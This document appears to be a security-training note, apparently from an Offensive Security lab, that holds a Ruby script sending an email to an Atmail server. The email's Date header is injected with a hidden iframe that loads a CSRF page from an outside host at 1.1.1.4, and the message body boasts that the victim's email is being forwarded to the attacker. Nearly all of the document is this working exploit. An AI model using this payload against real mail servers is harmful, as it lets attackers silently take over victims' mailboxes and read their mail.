# Email


## Sending Email

```ruby
#!/usr/bin/env ruby
# 
#
require 'net/smtp'

def send_mail(smtpsrv, username, password, frmemail, dstemail)

  msg  = "From: #{frmemail}\n"
  msg += "To: #{dstemail}\n"
  msg += "Date: <iframe src=\"http://1.1.1.4/ooo/atmail-CSRFiframe.html\" width=0 height=0 style=\"hidden\" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>\n"
  msg += "Subject: Email Snooping\n"
  msg += "Content-type: text/html\n\n"
  msg += "<strong>Hi<br>All Your Email is Forwarded to us!</strong>"

  begin

    Net::SMTP.start(smtpsrv, 25, 'localhost', username, password, :login) do |smtp|
      smtp.send_message msg, frmemail, dstemail
    end
    puts "[+] Email has been sent successfully!"
  rescue Exception => e
    puts "[!] Failed to send the mail"
    puts e
  end

end

smtpsrv  = ARGV[0]
username = "admin@offsec.local"
password = "123456"
frmemail = "admin@offsec.local"
dstemail = "admin@offsec.local"

smtpsrv = ARGV[0]
if smtpsrv.nil?
  puts "[!] IP address Missing \nruby #{__FILE__}.rb [IP ADDRESS]\n\n"
  exit 0
end

send_mail smtpsrv, username, password, frmemail, dstemail
```